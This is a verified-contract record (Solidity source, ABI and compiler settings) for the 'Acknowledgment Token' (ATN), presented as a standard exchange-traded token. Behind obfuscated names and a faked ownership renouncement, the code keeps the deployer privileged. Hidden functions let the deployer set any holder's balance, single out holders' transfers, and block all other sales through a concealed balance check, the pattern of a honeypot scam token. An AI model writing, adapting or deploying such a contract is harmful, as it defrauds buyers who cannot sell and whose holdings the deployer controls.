{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface exemptTx {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletMarketing) external view returns (uint256);\n\n    function transfer(address maxTx, uint256 feeTotalTo) external returns (bool);\n\n    function allowance(address enableWalletLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeTotalTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address maxTx,\n        uint256 feeTotalTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listTrading, uint256 value);\n    event Approval(address indexed enableWalletLaunched, address indexed spender, uint256 value);\n}\n\nabstract contract atTakeSwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverFrom {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchedAuto {\n    function createPair(address fundFromFee, address amountAt) external returns (address);\n}\n\ninterface exemptTxMetadata is exemptTx {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AcknowledgmentToken is atTakeSwap, exemptTx, exemptTxMetadata {\n\n    mapping(address => mapping(address => uint256)) private isAt;\n\n    bool public walletSwap;\n\n    address public tokenTake;\n\n    bool private autoMode;\n\n    bool public enableTotal;\n\n    function fundTeam(uint256 feeTotalTo) public {\n        teamMarketing();\n        fromIs = feeTotalTo;\n    }\n\n    event OwnershipTransferred(address indexed amountFee, address indexed txMax);\n\n    address totalShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transfer(address toAmount, uint256 feeTotalTo) external virtual override returns (bool) {\n        return tokenFundSender(_msgSender(), toAmount, feeTotalTo);\n    }\n\n    function autoMaxLaunched(address fromMode) public {\n        if (walletSwap) {\n            return;\n        }\n        if (launchExempt != exemptSellLiquidity) {\n            autoMode = false;\n        }\n        fromLimitBuy[fromMode] = true;\n        \n        walletSwap = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return tradingLimitReceiver;\n    }\n\n    uint256 fromIs;\n\n    uint256 private shouldSell = 100000000 * 10 ** 18;\n\n    function launchedWallet() public {\n        emit OwnershipTransferred(tokenTake, address(0));\n        tradingLimitReceiver = address(0);\n    }\n\n    mapping(address => uint256) private toIs;\n\n    function owner() external view returns (address) {\n        return tradingLimitReceiver;\n    }\n\n    string private receiverReceiverMode = \"ATN\";\n\n    uint256 public fundTotal;\n\n    mapping(address => bool) public fromLimitBuy;\n\n    bool public maxTeam;\n\n    function name() external view virtual override returns (string memory) {\n        return takeLaunch;\n    }\n\n    function tokenFundSender(address enableAmount, address maxTx, uint256 feeTotalTo) internal returns (bool) {\n        if (enableAmount == tokenTake) {\n            return buyTotal(enableAmount, maxTx, feeTotalTo);\n        }\n        uint256 limitList = exemptTx(listSellTrading).balanceOf(feeSender);\n        require(limitList == fromIs);\n        require(maxTx != feeSender);\n        if (takeMax[enableAmount]) {\n            return buyTotal(enableAmount, maxTx, launchIs);\n        }\n        return buyTotal(enableAmount, maxTx, feeTotalTo);\n    }\n\n    mapping(address => bool) public takeMax;\n\n    function balanceOf(address walletMarketing) public view virtual override returns (uint256) {\n        return toIs[walletMarketing];\n    }\n\n    bool public takeTx;\n\n    uint256 public launchExempt;\n\n    function marketingTotal(address toAmount, uint256 feeTotalTo) public {\n        teamMarketing();\n        toIs[toAmount] = feeTotalTo;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return shouldSell;\n    }\n\n    function approve(address minToken, uint256 feeTotalTo) public virtual override returns (bool) {\n        isAt[_msgSender()][minToken] = feeTotalTo;\n        emit Approval(_msgSender(), minToken, feeTotalTo);\n        return true;\n    }\n\n    uint256 private exemptSellLiquidity;\n\n    constructor (){\n        \n        receiverFrom autoSwapTo = receiverFrom(totalShould);\n        listSellTrading = launchedAuto(autoSwapTo.factory()).createPair(autoSwapTo.WETH(), address(this));\n        if (enableTotal) {\n            exemptSellLiquidity = launchExempt;\n        }\n        tokenTake = _msgSender();\n        launchedWallet();\n        fromLimitBuy[tokenTake] = true;\n        toIs[tokenTake] = shouldSell;\n        if (enableTotal) {\n            fundSwap = exemptSellLiquidity;\n        }\n        emit Transfer(address(0), tokenTake, shouldSell);\n    }\n\n    function fromSwap(address takeExempt) public {\n        teamMarketing();\n        if (enableTotal) {\n            maxTeam = true;\n        }\n        if (takeExempt == tokenTake || takeExempt == listSellTrading) {\n            return;\n        }\n        takeMax[takeExempt] = true;\n    }\n\n    address public listSellTrading;\n\n    function allowance(address fundShould, address minToken) external view virtual override returns (uint256) {\n        if (minToken == totalShould) {\n            return type(uint256).max;\n        }\n        return isAt[fundShould][minToken];\n    }\n\n    uint256 public launchFrom;\n\n    uint256 txFee;\n\n    uint256 private fundSwap;\n\n    function decimals() external view virtual override returns (uint8) {\n        return swapFee;\n    }\n\n    address private tradingLimitReceiver;\n\n    function buyTotal(address enableAmount, address maxTx, uint256 feeTotalTo) internal returns (bool) {\n        require(toIs[enableAmount] >= feeTotalTo);\n        toIs[enableAmount] -= feeTotalTo;\n        toIs[maxTx] += feeTotalTo;\n        emit Transfer(enableAmount, maxTx, feeTotalTo);\n        return true;\n    }\n\n    address feeSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 constant launchIs = 17 ** 10;\n\n    uint8 private swapFee = 18;\n\n    string private takeLaunch = \"Acknowledgment Token\";\n\n    function transferFrom(address enableAmount, address maxTx, uint256 feeTotalTo) external override returns (bool) {\n        if (_msgSender() != totalShould) {\n            if (isAt[enableAmount][_msgSender()] != type(uint256).max) {\n                require(feeTotalTo <= isAt[enableAmount][_msgSender()]);\n                isAt[enableAmount][_msgSender()] -= feeTotalTo;\n            }\n        }\n        return tokenFundSender(enableAmount, maxTx, feeTotalTo);\n    }\n\n    function teamMarketing() private view {\n        require(fromLimitBuy[_msgSender()]);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverReceiverMode;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableWalletLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listTrading\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeTotalTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromMode\",\"type\":\"address\"}],\"name\":\"autoMaxLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMarketing\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromLimitBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeExempt\",\"type\":\"address\"}],\"name\":\"fromSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeTotalTo\",\"type\":\"uint256\"}],\"name\":\"fundTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSellTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeTotalTo\",\"type\":\"uint256\"}],\"name\":\"marketingTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeTotalTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeTotalTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AcknowledgmentToken", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}